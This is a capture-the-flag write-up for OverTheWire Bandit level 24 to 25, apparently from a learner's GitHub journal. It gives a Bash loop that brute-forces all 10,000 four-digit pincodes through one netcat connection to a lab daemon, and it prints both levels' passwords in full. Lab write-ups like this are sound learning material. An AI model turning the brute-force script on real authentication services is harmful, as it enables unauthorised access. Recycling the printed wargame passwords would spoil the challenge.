# Bandit Level 24 → 25
[Here's the link 😄](https://overthewire.org/wargames/bandit/bandit25.html)
## 📝 **Challenge Description**  
The password for `bandit25` is given if the user enters the password for `bandit24` and a secret numeric 4-digit pincode on **localhost:30002**. There is no way to retrieve the pincode except by going through all of the 10000 possible combinations. The level also states that we do not need to create new connections each time we input the password and 4 digit pincode combination.

## 🔍 **What I Initially Tried**  
The only way to solve this level is to create a script that will allow us to pass the password for `bandit24` and allow us to loop through all possible combinations of 4 digit numbers from **0000 to 9999**. Like in other programming languages, we can use a **for loop** to loop through a sequence of objects in this case we are looping through numbers ranging from 0000 to 9999. Then we can save each value along with the password for `bandit24` and pass it into the daemon via `nc`. 

## ✔️ What Worked
Since we do not write permissions in the home directory, I created a temporary directory and saved the script in there:
```bash
mktemp -d
/tmp/tmp.QdMtYOoSfv
vi script.sh
```

For this script, I looped through all values between 0000 and 9999 and piped everything into a `nc` connection:
```bash
#!/bin/bash
{
for i in {0000..9999}
do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done
} | nc localhost 30002
```
This allows us to use **one netcat connection** instead of one for each password and pincode combination. Having the `nc` connection setup like this allows us to avoid having to loop through all 10,000 possible combinations of pincodes and passwords and passing them each time into the `nc` connection. That would be inefficient and time consuming.

After I ran the script, eventually the password for `bandit25` was given:
```
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
## 🧠 Key Learnings
- Learned how to write efficient for loops in Bash to **brute-force** 4 digit pincodes and pass them to standard output.
- Learned how to effectively take standard output and pipe it into a `nc` connection as standard input.  



## 🔐 Next Step
Now let's move onto **level 25**. 

➡️ [Continue to Level 25 →](https://github.com/aminuzz/Bandit-CTF-Journey/blob/main/level%2025.md)
